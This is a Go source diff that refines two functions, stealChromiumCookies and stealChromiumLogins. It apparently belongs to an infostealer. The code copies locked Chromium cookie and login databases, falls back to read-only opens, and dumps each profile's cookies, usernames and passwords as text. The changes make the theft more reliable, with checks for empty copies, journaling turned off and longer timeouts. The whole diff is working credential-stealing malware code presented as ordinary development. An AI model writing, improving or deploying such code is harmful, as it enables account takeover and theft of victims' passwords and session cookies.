@@ -167,20 +167,24 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ck_%s_%s_%d", browserName, strings.ReplaceAll(profile, " ", ""), time.Now().UnixNano()))
 		copyOk := false
 		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err == nil {
-			_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
-			_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", browserExe)
-			copyOk = true
+			if info, serr := os.Stat(tmpPath); serr == nil && info.Size() > 0 {
+				_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
+				_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", browserExe)
+				copyOk = true
+			} else {
+				os.Remove(tmpPath)
+			}
 		}
 
-		var dbPath string
+		var dsn string
 		if copyOk {
-			dbPath = tmpPath
+			dsn = tmpPath
 			defer os.Remove(tmpPath)
 			defer os.Remove(tmpPath + "-wal")
 			defer os.Remove(tmpPath + "-shm")
 		} else {
-			clean := strings.ReplaceAll(cookiePath, string(os.PathSeparator), "/")
-			dbPath = "file:" + clean + "?immutable=1"
+			clean := strings.ReplaceAll(cookiePath, "\\", "/")
+			dsn = "file:" + clean + "?mode=ro&immutable=1"
 		}
 
 		type queryResult struct {
@@ -188,25 +192,19 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			err     string
 		}
 		ch := make(chan queryResult, 1)
-		go func(path string, copied bool) {
-			var dsn string
-			if copied {
-				dsn = path
-			} else {
-				clean := strings.ReplaceAll(path, "\\", "/")
-				dsn = "file:" + clean + "?mode=ro&immutable=1"
-			}
-			db, err := sql.Open("sqlite", dsn)
+		go func(openDSN, bName, prof string) {
+			db, err := sql.Open("sqlite", openDSN)
 			if err != nil {
-				ch <- queryResult{"", fmt.Sprintf("%s/%s open: %v", browserName, profile, err)}
+				ch <- queryResult{"", fmt.Sprintf("%s/%s open: %v", bName, prof, err)}
 				return
 			}
 			defer db.Close()
 			db.Exec("PRAGMA busy_timeout = 10000")
+			db.Exec("PRAGMA journal_mode = OFF")
 
 			rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
 			if err != nil {
-				ch <- queryResult{"", fmt.Sprintf("%s/%s query: %v", browserName, profile, err)}
+				ch <- queryResult{"", fmt.Sprintf("%s/%s query: %v", bName, prof, err)}
 				return
 			}
 			defer rows.Close()
@@ -225,11 +223,11 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 				buf.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n", host, name, value, path, expires))
 			}
 			if rowCount == 0 {
-				ch <- queryResult{"", fmt.Sprintf("%s/%s: 0 rows", browserName, profile)}
+				ch <- queryResult{"", fmt.Sprintf("%s/%s: 0 rows", bName, prof)}
 				return
 			}
 			ch <- queryResult{buf.String(), ""}
-		}(dbPath, copyOk)
+		}(dsn, browserName, profile)
 
 		select {
 		case res := <-ch:
@@ -239,7 +237,7 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			if res.cookies != "" {
 				allCookies.WriteString(res.cookies)
 			}
-		case <-time.After(10 * time.Second):
+		case <-time.After(15 * time.Second):
 			errs = append(errs, fmt.Sprintf("%s/%s: timeout", browserName, profile))
 		}
 	}
@@ -260,28 +258,32 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_lg_%s_%s_%d", browserName, strings.ReplaceAll(profile, " ", ""), time.Now().UnixNano()))
 		copyOk := false
 		if err := copyFileLocked(loginPath, tmpPath, browserExe); err == nil {
-			copyOk = true
+			if info, serr := os.Stat(tmpPath); serr == nil && info.Size() > 0 {
+				copyOk = true
+			} else {
+				os.Remove(tmpPath)
+			}
 		}
 
-		var dbPath string
+		var dsn string
 		if copyOk {
-			dbPath = tmpPath
+			dsn = tmpPath
 			defer os.Remove(tmpPath)
 		} else {
-			clean := strings.ReplaceAll(loginPath, string(os.PathSeparator), "/")
-			dbPath = "file:" + clean + "?immutable=1"
+			clean := strings.ReplaceAll(loginPath, "\\", "/")
+			dsn = "file:" + clean + "?mode=ro&immutable=1"
 		}
 
 		ch := make(chan string, 1)
-		go func(path string) {
-			dsn := path
-			db, err := sql.Open("sqlite", dsn)
+		go func(openDSN string) {
+			db, err := sql.Open("sqlite", openDSN)
 			if err != nil {
 				ch <- ""
 				return
 			}
 			defer db.Close()
 			db.Exec("PRAGMA busy_timeout = 10000")
+			db.Exec("PRAGMA journal_mode = OFF")
 
 			rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
 			if err != nil {
@@ -307,14 +309,14 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 				buf.WriteString(fmt.Sprintf("URL: %s\nLogin: %s\nPassword: %s\n\n", url, username, password))
 			}
 			ch <- buf.String()
-		}(dbPath)
+		}(dsn)
 
 		select {
 		case res := <-ch:
 			if res != "" {
 				sb.WriteString(res)
 			}
-		case <-time.After(10 * time.Second):
+		case <-time.After(15 * time.Second):
 		}
 	}
 	return sb.String()
